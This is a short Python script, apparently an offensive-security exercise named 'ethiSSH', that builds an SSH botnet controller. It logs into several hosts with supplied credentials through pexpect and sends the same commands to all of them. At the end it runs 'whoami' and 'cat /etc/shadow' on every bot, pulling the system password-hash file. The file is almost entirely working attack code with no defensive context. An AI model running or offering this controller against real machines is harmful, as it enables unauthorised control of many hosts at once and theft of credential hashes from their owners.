import optparse
from pexpect import pxssh
import pyfiglet


class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('> Connection error')

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print(' > output from ' + client.host)
        print(' >' + output + '\n')

def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

n = "ethiSSH"
ascii = pyfiglet.figlet_format(n,font='doom')
print(ascii)

botNet = []


num_bots = int(input("Botnets instantiation: "))
for _ in range(num_bots):
    host = input("Enter bot hostname: ")
    user = input("Enter bot username: ")
    password = input("Enter bot password: ")
    addClient(host, user, password)

botnetCommand('whoami')
botnetCommand('cat /etc/shadow')


